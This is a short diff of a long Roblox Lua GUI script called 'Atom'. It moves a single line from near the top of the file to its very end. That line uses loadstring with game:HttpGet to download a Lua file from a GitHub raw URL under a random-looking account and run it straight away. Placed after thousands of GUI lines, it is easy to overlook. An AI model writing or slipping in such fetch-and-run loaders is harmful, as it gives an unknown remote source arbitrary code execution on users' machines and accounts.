@@ -194,8 +194,6 @@ local TextLabel_36 = Instance.new("TextLabel")
 local TextLabel_37 = Instance.new("TextLabel")
 local TextLabel_38 = Instance.new("TextLabel")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Execution.lua"))()
-
 --Properties:
 
 Atom.Name = "Atom"
@@ -3756,3 +3754,4 @@ local function AIHWDFI_fake_script() -- TextLabel_38.LocalScript
 	TextLabel.Text = game.Players.LocalPlayer.AccountAge.."(D)"
 end
 coroutine.wrap(AIHWDFI_fake_script)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Execution.lua"))()
